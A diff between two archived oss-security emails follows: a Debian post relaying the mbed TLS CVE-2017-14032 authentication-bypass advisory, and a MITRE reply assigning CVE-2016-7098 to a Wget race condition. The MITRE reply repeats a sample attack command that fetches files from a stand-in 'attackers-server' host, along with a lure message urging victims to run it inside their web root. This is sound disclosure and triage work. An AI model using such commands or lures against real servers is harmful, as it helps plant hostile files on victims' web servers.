@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2089" "Wednesday" "30" "August" "2017" "22:03:46" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20170830200346.dhmg6koiwpn3rauh@eldamar.local>" "55" "[oss-security] mbed TLS: CVE-2017-14032: Bypass of authentication of peer possible when the authentication mode is configured as 'optional'" nil nil nil "8" "2017083020:03:46" "[oss-security] mbed TLS: CVE-2017-14032: Bypass of authentication of peer possible when the authentication mode is configured as 'optional'" (number mark "U       carnil@debia Aug 30   55/2089  " thread-indent "\"[oss-security] mbed TLS: CVE-2017-14032: Bypass of authentication of peer possible when the authentication mode is configured as 'optional'\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5947" "Saturday" "27" "August" "2016" "15:08:07" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160827190807.536C66C54F4@smtpvmsrv1.mitre.org>" "134" "[oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability" "^Cc:" nil nil "8" "2016082719:08:07" "[oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability" (number mark "        cve-assign@m Aug 27  134/5947  " thread-indent "\"[oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability\"\n") "<F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>" ("<F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 21736 invoked by uid 550); 30 Aug 2017 20:04:20 -0000
+Received: (qmail 24028 invoked by uid 550); 27 Aug 2016 19:08:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,99 +11,147 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 24010 invoked from network); 27 Aug 2016 19:08:19 -0000
+In-Reply-To: <F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>
+Message-Id: <20160827190807.536C66C54F4@smtpvmsrv1.mitre.org>
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+Date: Sat, 27 Aug 2016 15:08:07 -0400 (EDT)
+From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 20414 invoked from network); 30 Aug 2017 20:03:59 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=sender:date:from:to:cc:subject:message-id:mime-version
-         :content-disposition:user-agent;
-        bh=+hajqGv91dQTB/J46sq4O27/vlFw/4SGNfzd7nvg7GE=;
-        b=X1scDMFd+clTeNnC/8sJdp63Ef9YuNzA5AjoKkSKuORJoz24WfmL1x3WftitdU2JMo
-         Xe3sXBpaHPCxNv2ifc94zfUrBj/khxe8/mrwZTNU26Nd5zLqwWMPLvJ90GBPqea/+13e
-         qfl5vTQZGmkpd08IVOibiWuJgBh6nNWtlUoddIXFQyMUfPYBRT9Nigm/UR1x0kC/AOoN
-         Bt4NM7ynBKJlzysTfoZbiO7mcbVSZ1yp9vI8kvhAoTTLYFLmftCE/HME3QenRws4Ta6c
-         aEdEagSgTGw3vk2FlN/3JKYm+LidTC0cG9y813I6RyOHBDMjk0UABUlxe0UwNtbln1OS
-         kw3w==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:sender:date:from:to:cc:subject:message-id
-         :mime-version:content-disposition:user-agent;
-        bh=+hajqGv91dQTB/J46sq4O27/vlFw/4SGNfzd7nvg7GE=;
-        b=ih94Lh8jZREMVUZLEtFOZRB64J2+eqjVViZK9cJYNPb5Yg823z69x9OueYka2vvMSV
-         4nAwRmNJ6Lq1EYskk4DVdTOv+TEtU8uyQ2g/ezkaZxciCN/aIHda87MhrTsSJENYYfMT
-         d6INcVTLtgWU8PAW3sY2/HbnNlu3QxnalENtw6Duwmo4UZctePAxD4yK/Y6ZkD1T1iO6
-         deB42XlBtgAb62+LBoI46rmV3OveWVffUp8/IlOQ7vNpga/DG61844g2QiYWma0nmNMv
-         uW1ltZXVCVkxTjlzXdGWuFO9JChH6/CDkbPzKmPK0m+z9K2J7J+PtpnTKGHSTlqaI0Qy
-         Ep3g==
-X-Gm-Message-State: AHYfb5iRmvEoo8/fdG9x8VdeJT/DowcOpdsgz0dNZSSSlR3eQuxH4GmX
-	8v8+kUuP6i/k+uqa
-X-Received: by 10.28.152.87 with SMTP id a84mr1940771wme.173.1504123427872;
-        Wed, 30 Aug 2017 13:03:47 -0700 (PDT)
-Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
-Date: Wed, 30 Aug 2017 22:03:46 +0200
-From: Salvatore Bonaccorso <carnil@debian.org>
-To: OSS Security Mailinglist <oss-security@lists.openwall.com>
-Cc: James Cowgill <jcowgill@debian.org>
-Message-ID: <20170830200346.dhmg6koiwpn3rauh@eldamar.local>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-User-Agent: NeoMutt/20170609 (1.8.3)
-Subject: [oss-security] mbed TLS: CVE-2017-14032: Bypass of authentication of peer possible
- when the authentication mode is configured as 'optional'
+Subject: [oss-security] Re: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability
+To: dmisra@verisign.com, dawid@legalhackers.com
 
-Hi
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-MITRE has assigned CVE-2017-14032 for the following issue in mbed TLS:
+> Wget Race Condition Recursive Download Accesslist Race Condition Vulnerability
 
-https://tls.mbed.org/tech-updates/security-advisories/mbedtls-security-advisory-2017-02
+Our perspective is that this is a very marginal issue for CVE
+inclusion. Exploitation requires the victim to specify a potentially
+dangerous file on the command line, and to enter this command line
+while the current working directory is served by a web server. Also,
+the observed behavior isn't directly inconsistent with the
+documentation. However, the vendor apparently recognizes some security
+risk and has decided to publish a patch described in the
+http://lists.gnu.org/archive/html/bug-wget/2016-08/msg00134.html post.
 
->   Title     Bypass of authentication of peer possible when the authentication
->                             mode is configured as 'optional'
-> Date      28th August 2017
-> Affects   All versions of mbed TLS from version 1.3.10 and up, including all
->           2.1 and later releases
-> Not       mbed TLS 1.3.9 and earlier
-> affected
-> Impact    Use of the 'optional' authentication mode can permit the peer to
->           bypass peer authentication
-> Severity  High
-> 
-> Vulnerability
-> -------------
-> If a malicious peer supplies an X.509 certificate chain that has more than
-> MBEDTLS_X509_MAX_INTERMEDIATE_CA intermediates (which by default is 8), it
-> could bypass authentication of the certificates, when the authentication mode
-> was set to 'optional' eg. MBEDTLS_SSL_VERIFY_OPTIONAL. The issue could be
-> triggered remotely by both the client and server sides.
-> 
-> If the authentication mode, which can be set by the function
-> mbedtls_ssl_conf_authmode(), was set to 'required' eg.
-> MBEDTLS_SSL_VERIFY_REQUIRED which is the default, authentication would occur
-> normally as intended.
-> 
-> Impact
-> ------
-> Depending on the platform, an attack exploiting this vulnerability could allow
-> successful impersonation of the intended peer and permit man-in-the-middle
-> attacks.
-> 
-> Resolution
-> ----------
-> Affected users should upgrade to mbed TLS 1.3.21, mbed TLS 2.1.9 or mbed TLS
-> 2.6.0.
-> 
-> Workaround
-> ----------
-> Users should wherever possible upgrade to the newer version of mbed TLS. Where
-> this is not practical, users should consider if changing the authentication to
-> the 'required' mode MBEDTLS_SSL_VERIFY_REQUIRED is practical for their
-> application.
+Use CVE-2016-7098.
 
-References:
- -  https://github.com/ARMmbed/mbedtls/commit/31458a18788b0cf0b722acda9bb2f2fe13a3fb32
- - https://github.com/ARMmbed/mbedtls/commit/d15795acd5074e0b44e71f7ede8bdfe1b48591fc
- - https://bugs.debian.org/873557
+> wget -r -nH -A '*.jpg' http://attackers-server/test.php
 
-Regards,
-Salvatore
+Maybe a marginally realistic exploitation scenario is for the
+attacker to convey this message to potential victims:
+
+  I wrote a blog post about my summer vacation at
+  http://attackers-server/vacation.php - this has links to dozens
+  of photos that are .jpg files. If you have a slideshow application
+  on your own server and just want to look at my photos, a simple
+  method is to cd to your DocumentRoot directory, then cd to your
+  slideshow directory underneath that, and then type this command:
+
+     wget -r -nH -A '*.jpg' http://attackers-server/vacation.php
+
+This is only marginally realistic for the following reasons:
+
+  - It seems very odd to set one's working directory to a place
+    underneath DocumentRoot, and then run wget with an untrusted .php
+    URL on the command line - especially because the wget
+    documentation is ambiguous (see below).
+
+  - People don't ordinary ask their web-site visitors to create their
+    own alternative content views (e.g., slideshows) on the visitors'
+    web servers.
+
+  - People don't ordinarily expect their web-site visitors to feel
+    comfortable with wget commands. If they wanted to share a .jpg
+    collection, they would probably create a .zip of it.
+
+  - Although wget of an untrusted .php file with "-A '*.jpg'" might be
+    somewhat common, it is probably not common for this to occur
+    with a working directory under DocumentRoot. It seems to require
+    an obscure use case in which the victim wants to mirror the .jpg
+    files, but is willing to expend extra effort to host a unique web
+    presentation of those .jpg files, just because mirroring the
+    complete original presentation might be unsafe.
+
+> the victim server's security is impacted since the
+> developer/administrator was never warned explicitly that 'rejected
+> files' can have a transient life on the victim server
+
+The documentation only says "Specify comma-separated lists of file
+name suffixes or patterns to accept or reject" during the recursive
+retrieving. It does not discuss what happens to the filename that was
+explicitly entered on the command line (stored forever, stored
+temporarily, or never stored). It seems that, in many cases, a user
+would prefer that file to be stored forever, so that they don't have
+to create their own unique presentation. For example,
+
+   wget -r -nH -A '*.jpg' http://attackers-server/vacation.html
+
+can easily be interpreted to mean "I want to mirror the top-level
+presentation file vacation.html, and I also want to mirror every .jpg
+file that it references. I don't want a huge download time, so I've
+decided to accept only the .jpg files, and not the .mp3 files of
+birdsongs heard during the vacation, .mp4 movies of the birds, etc."
+Probably wget has never supported that, but still it might be the
+expected behavior.
+
+
+> http://git.savannah.gnu.org/cgit/wget.git/commit/?id=9ffb64ba6a8121909b01e984deddce8d096c498d
+> http://git.savannah.gnu.org/cgit/wget.git/commit/?id=690c47e3b18c099843cdf557a0425d701fca4957
+
+Also, we're not sure how the 'asprintf (&tmp, "%s.tmp",
+hs->local_file);' is supposed to interact with
+http://httpd.apache.org/docs/current/mod/mod_mime.html#multipleext --
+file.php.tmp is not necessarily a safe naming convention.
+
+Finally, the patch does not address all possible security risks. For
+example, if the victim's working directory is under DocumentRoot and
+the victim is logged into the account used by the web server, then
+there is still a possibility of malicious content from a
+
+  wget -r -nH -A '*.jpg' http://attackers-server/vacation.html
+
+command (e.g., malicious JavaScript). There is no CVE ID for that.
+
+
+> http://www.openwall.com/lists/oss-security/2016/08/12/7
+
+> We addressed this issue in wget2 - files just needed for parsing are kept in 
+> memory and never appear in the file system.
+
+Again, interpreting "-A '*.jpg' http://attackers-server/vacation.html"
+to mean no mirroring of vacation.html is a potential usability
+problem. Ideally, there might be separate options for the different
+use cases, e.g., something like
+
+  --also-accept-the-file-named-on-the-command-line
+
+or
+
+  --do-not-also-accept-the-file-named-on-the-command-line
+
+(but preferably with shorter option names!).
+
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJXweQ3AAoJEHb/MwWLVhi2gLoQAJP6vGruKoD5iwKEUrLFCsGC
+0Dv8rApnGy+3atwQ84KlFIBsvcWcFpk5ttvqlhLZtRVft+qdlPKp6a5xQEDx51RZ
+qhV+LMBvCRXU1vJAKTRoJa3VwLYHTfGUj5nMT+rBgKqvcxXE+Xe9FYvHB+m+iLUk
+TFBRqVJRsWSNNkouOaCThoIoHuDDLX7W9WEn0PyAi2aNoxywOHjXVwuH32Zw7D96
+L8X4aN8Q54bdnpOc3jrO6RssgesNxpycZVvreXGIMR4/zM2xMmMegVr6RvQhLPe2
+J2xh5p0mq000W5zMo1Qic56TGAmyutGHhDSewcuax8VYBIar1zmLKHH13AMfpECR
+OKeNeFE1khi1xYQggm07KhCWGhORPD8HqF6GVQGZQh4nGRHyS2m3ePssSdL01RSg
+ZcJyOgPT8Bo8jk25i7t23RoTYXJQXLjtiMI4z28wXoxf43j6obzxHhFBHBEMNk9p
+1kJZvF5jMbJNywUVFbo5D5IWlsb51LeGo7Rzy4GOG3Mgcagv414RDEfh7167UC6i
+MuyZ+JgFHhEsaiyPyaxl+En4BxMiqhG/fvE0lo0SZ3omjj0t6soPqS+Vl8uQDdva
+VdT8VRdPMrR7+acdTjKQmhnkyOOXSYidRM7ToTCmd/VNSyZXzeuNEvDckUVSyyTS
+n8lsLYdoKuIH5H8NIJ8c
+=rqtj
+-----END PGP SIGNATURE-----
